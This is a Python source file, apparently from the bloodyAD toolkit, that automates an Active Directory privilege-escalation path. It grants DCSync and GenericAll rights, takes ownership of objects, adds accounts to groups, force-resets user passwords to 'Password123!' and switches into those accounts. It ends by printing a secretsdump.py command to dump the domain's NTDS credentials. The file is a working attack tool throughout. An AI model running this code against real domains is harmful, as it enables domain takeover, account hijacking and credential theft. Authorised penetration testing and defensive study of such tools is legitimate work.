from bloodyAD import config, modules, utils

LOG = utils.LOG
class Automation:
    def __init__(self, args, path):
        self.co_args = args
        self.path = path
        self.rel_types = {
            0 : self._nextHop,
            1 : self._dcSync,
            2 : self._setDCSync,
            3 : self._ownerDomain,
            100 : self._addMember,
            200 : self._aclGroup,
            300 : self._ownerGroup,
            100000 : self._forceChangePassword,
            100001 : self._aclObj,
            100002 : self._ownerObj,
            100100 : self._forceChangePassword,
            100101 : self._aclObj,
            100102 : self._ownerObj,
            250: self._genericAll,
            350: self._ownerSpecialObj
        }
        self.dirty_laundry = []


    def simulate(self):
        self.simulation = True
        self.rel_str = {
            "setDCSync" : "[Add DCSync right] to {}",
            "delObjectFromGroup" : "[Add member] {} to the group {}",
            "setGenericAll" : "[Add GenericAll right] to {} for {}",
            "setOwner" : "[Give ownership] to {} for {}",
            "changePassword" : "[Change password] of {} to {}"
        }
        print(f"\nAuthenticated as {self.co_args.username}:\n")
        self._unfold()
        
    
    def exploit(self):
        self.simulation = False
        self.conn = config.ConnectionHandler(self.co_args)
        self._unfold()
        self.conn.close()
    

    def _unfold(self):
        for rel in self.path:
            if not self.simulation:
                LOG.info("")
            typeID = rel['cost']
            try:
                self.rel_types[typeID](rel)
            except Exception as e:
                self._washer()
                raise e
                


    def _washer(self):
        if self.simulation:
            print()
        self.dirty_laundry.reverse()
        for laundry in self.dirty_laundry:
            if self.simulation:
                self._printOperation(laundry['f'].__name__, laundry['args'], True)
            else:
                laundry['f'](self.conn, *laundry['args'])
        self.dirty_laundry = []


    def _switchUser(self, user, pwd):
        self._washer()
        if self.simulation:
            print(f"\nAuthenticated as {user}:\n")
        else:
            self.conn.switchUser(user, pwd)


    def _nextHop(self, rel):
        return
    

    def _dcSync(self, rel):
        if not self.simulation:
            print(f"[+] You can now dump the NTDS using: secretsdump.py '{self.conn.conf.domain}/{self.conn.conf.username}:{self.conn.conf.password}@{self.conn.conf.host}'")
    

    def _setDCSync(self, rel):
        operation = modules.setDCSync
        if self.simulation:
            user = rel['start_node']['name']
            self._printOperation(operation.__name__, [user])
        else:
            user = rel['start_node']['distinguishedname']
            operation(self.conn, user)
    

    def _ownerDomain(self, rel):
        self._setOwner(rel)
        self._setDCSync(rel)


    def _addMember(self, rel):       
        operation = modules.delObjectFromGroup
        if self.simulation:
            member = rel['start_node']['name']
            group = rel['end_node']['name']
            self._printOperation(operation.__name__, [member, group])
        else:
            member = rel['start_node']['objectid']
            group = rel['end_node']['distinguishedname']
            modules.addForeignObjectToGroup(self.conn, member, group)
            self.conn.close()
        self.dirty_laundry.append({'f':operation, 'args':[member,group]})


    def _aclGroup(self, rel):
        self._genericAll(rel)
        self._addMember(rel)
    

    def _ownerGroup(self, rel):
        self._setOwner(rel)
        self._aclGroup(rel)
    

    def _aclObj(self, rel):
        self._genericAll(rel)
        self._forceChangePassword(rel)
    

    def _ownerObj(self, rel):
        self._setOwner(rel)
        self._aclObj(rel)
    

    def _ownerSpecialObj(self, rel):
        self._setOwner(rel)
        self._genericAll(rel)


    # TODO: change password change with shadow credentials when it's possible
    # TODO: don't perform change password if it's explicitly refused by user
    def _forceChangePassword(self, rel):
        pwd = 'Password123!'
        operation = modules.changePassword
        if self.simulation:
            user = rel['end_node']['name']
            self._printOperation(operation.__name__, [user, pwd])
        else:
            user = rel['end_node']['distinguishedname']
            operation(self.conn, user, pwd)
            user = utils.getObjAttr(self.conn, user, 'sAMAccountName')['attributes']['sAMAccountName']
            LOG.debug(f'[+] switching to LDAP connection for user {user}')
        self._switchUser(user, pwd)


    def _genericAll(self, rel):
        operation = modules.setGenericAll
        if self.simulation:
            user = rel['start_node']['name']
            target = rel['end_node']['name']
            self._printOperation(operation.__name__, [user, target])
        else:
            user = rel['start_node']['distinguishedname']
            target = rel['end_node']['distinguishedname']
            operation(self.conn, user, target)
        self.dirty_laundry.append({'f':operation, 'args':[user,target,'False']})
    

    def _setOwner(self, rel):
        operation = modules.setOwner
        if self.simulation:
            user = rel['start_node']['name']
            target = rel['end_node']['name']
            self._printOperation(operation.__name__, [user, target])
        else:
            user = rel['start_node']['distinguishedname']
            target = rel['end_node']['distinguishedname']
            operation(self.conn, user, target)
    

    def _printOperation(self, operation_name, operation_args, revert=False):
        operation_str = "\t"
        if revert:
            operation_str += "[-] Revert "
        else:
            operation_str += '[+] '

        operation_str += self.rel_str[operation_name]
        arg_nb = operation_str.count('{')
        print(operation_str.format(*operation_args[:arg_nb]))

        
